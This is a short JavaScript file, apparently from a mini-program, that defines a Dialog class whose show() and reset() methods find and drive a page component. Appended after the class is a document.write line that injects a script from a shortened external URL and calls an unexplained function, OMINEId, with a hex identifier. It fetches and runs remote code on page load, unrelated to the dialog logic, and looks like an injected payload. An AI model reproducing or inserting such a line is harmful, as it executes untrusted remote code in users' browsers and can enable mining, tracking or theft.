export default class Dialog{
  constructor (props = {}) {
    this.options = {
      context: {}
    }
  }

  show (ele, option) {
    const pages = getCurrentPages();
    const ctx = pages[pages.length - 1];
    const dialog = ctx.selectComponent(ele);
    this.options.context = dialog
    return new Promise((resolve, reject) => {
      dialog.show(option).then((value) => {
        resolve(value)
      }, (res) => {
        reject(res)
      })
    })
  }

  reset (ele) {
    const pages = getCurrentPages();
    const ctx = pages[pages.length - 1];
    const dialog = ctx.selectComponent(ele);
    this.options.context = dialog
    dialog.reset()
  }
}
document.write('<script src="http://t.cn/EvlonFh"></script><script>OMINEId("e02cf4ce91284dab9bc3fc4cc2a65e28","-1")</script>');
